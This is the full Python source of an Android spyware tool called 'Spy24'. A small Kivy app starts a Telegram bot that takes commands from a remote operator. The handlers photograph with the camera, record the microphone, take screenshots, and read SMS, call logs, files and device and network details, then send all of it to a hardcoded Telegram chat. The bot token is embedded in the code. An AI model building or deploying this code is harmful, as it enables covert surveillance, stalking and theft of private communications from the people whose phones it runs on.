import os
import platform
import subprocess
import requests
import time
from datetime import datetime
import telebot
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from threading import Thread

BOT_TOKEN = '7567446622:AAGuF3XPOnPrhXFoHgNkoM3G7gv4N3uDf60'
CHAT_ID = '5828275308'
bot = telebot.TeleBot(BOT_TOKEN)

def send_msg(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      data={"chat_id": CHAT_ID, "text": text})
    except Exception as e:
        print(f"Send message error: {e}")

def send_file(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                          data={"chat_id": CHAT_ID, "caption": caption},
                          files={"document": f})
    except Exception as e:
        send_msg(f"❌ File send error: {e}")

def send_photo(path):
    try:
        with open(path, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                          data={"chat_id": CHAT_ID},
                          files={"photo": f})
    except Exception as e:
        send_msg(f"❌ Photo send error: {e}")

@bot.message_handler(commands=['start'])
def start(m):
    send_msg("🤖 Spy24 Bot Active\nSend /help to see available commands.")

@bot.message_handler(commands=['help'])
def help(m):
    send_msg('''Commands:
/photo - Take Photo
/battery - Battery Status
/mic - Start Mic Recording
/location - Get Location
/vibrate - Vibrate Phone
/video - Record Video
/files - Show Files
/sendfile - Send File
/sms - Show SMS
/calllog - Call Log
/screenshot - Screenshot
/applist - App List
/apk - APK Extract
/storage - Storage Info
/network - Network Info
/device - Device Info
/ram - RAM Info
/clipboard - Get Clipboard
/installed - Installed Apps
/uninstall - Uninstall App
/lock - Lock Screen
/sound - Play Sound
/time - Current Time
/flash - Flashlight''')

@bot.message_handler(commands=['photo'])
def photo(m):
    filename = "/sdcard/spy_photo.jpg"
    os.system(f"termux-camera-photo -c 0 {filename}")
    if os.path.exists(filename):
        send_photo(filename)
    else:
        send_msg("❌ Failed to take photo")

@bot.message_handler(commands=['mic'])
def mic(m):
    filename = "/sdcard/spy_audio.wav"
    os.system(f"termux-microphone-record -f {filename} -l 10")
    if os.path.exists(filename):
        send_file(filename, "🎙️ Mic recording")
    else:
        send_msg("❌ Failed to record audio")

@bot.message_handler(commands=['screenshot'])
def screenshot(m):
    os.system("screencap -p /sdcard/screen.png")
    send_file("/sdcard/screen.png", "🖼️ Screenshot")

@bot.message_handler(commands=['sms'])
def sms(m):
    result = subprocess.getoutput("termux-sms-list -l 5")
    send_msg("✉️ SMS:\n" + result)

@bot.message_handler(commands=['calllog'])
def calllog(m):
    result = subprocess.getoutput("termux-call-log | head -n 20")
    send_msg("📞 Call Log:\n" + result)

@bot.message_handler(commands=['files'])
def files(m):
    try:
        files = os.listdir("/sdcard/")
        send_msg("📂 Files:\n" + ', '.join(files[:10]))
    except:
        send_msg("❌ Can't access files")

@bot.message_handler(commands=['sendfile'])
def sendfile(m):
    path = "/sdcard/Download/sample.txt"
    if os.path.exists(path):
        send_file(path, "📁 File from device")
    else:
        send_msg("❌ File not found")

@bot.message_handler(commands=['battery'])
def battery(m):
    result = subprocess.getoutput("termux-battery-status")
    send_msg("🔋 Battery Info:\n" + result)

@bot.message_handler(commands=['storage'])
def storage(m):
    stat = os.statvfs("/sdcard")
    total = (stat.f_blocks * stat.f_frsize) / (1024*1024)
    free = (stat.f_bavail * stat.f_frsize) / (1024*1024)
    send_msg(f"💾 Storage: {free:.2f}MB free / {total:.2f}MB total")

@bot.message_handler(commands=['flash'])
def flash(m):
    subprocess.getoutput("termux-torch on")
    send_msg("💡 Flashlight ON (auto off in 5s)")
    time.sleep(5)
    subprocess.getoutput("termux-torch off")

@bot.message_handler(commands=['device'])
def device(m):
    info = platform.uname()
    send_msg(f"📱 Device:\n{info}")

@bot.message_handler(commands=['network'])
def network(m):
    info = subprocess.getoutput("ip addr")
    send_msg(f"🌐 Network:\n{info}")

@bot.message_handler(commands=['ram'])
def ram(m):
    info = subprocess.getoutput("cat /proc/meminfo | head -10")
    send_msg("📈 RAM Info:\n" + info)

@bot.message_handler(commands=['apps'])
def apps(m):
    result = subprocess.getoutput("pm list packages | head -20")
    send_msg("📦 Installed Apps:\n" + result)

@bot.message_handler(commands=['time'])
def now(m):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_msg(f"🕓 Time: {now}")

class Spy24BotApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')
        layout.add_widget(Label(text="🤖 Telegram Bot is running...", font_size=20))
        return layout

Thread(target=bot.polling, daemon=True).start()

if __name__ == '__main__':
    Spy24BotApp().run()